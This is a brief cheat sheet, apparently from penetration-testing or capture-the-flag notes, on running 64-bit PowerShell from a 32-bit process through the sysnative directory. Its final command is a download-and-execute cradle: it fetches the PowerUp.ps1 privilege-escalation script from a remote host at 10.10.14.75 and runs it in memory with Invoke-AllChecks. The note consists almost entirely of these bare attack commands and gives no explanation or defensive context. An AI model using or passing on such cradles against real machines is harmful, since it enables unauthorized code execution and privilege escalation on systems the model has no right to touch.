# Use 64-bit powershell script on 32-bit PC

## Commands

    powershell.exe -c "[Environment]::Is64BitProcess"

    cd C:\Windows\sysnative\WindowsPowerShell\v1.0\

    powershell.exe -c "[Environment]::Is64BitProcess"

    powershell.exe -c "iex(new-object net.webclient).downloadstring('http://10.10.14.75:81/PowerUp.ps1'); Invoke-AllChecks"
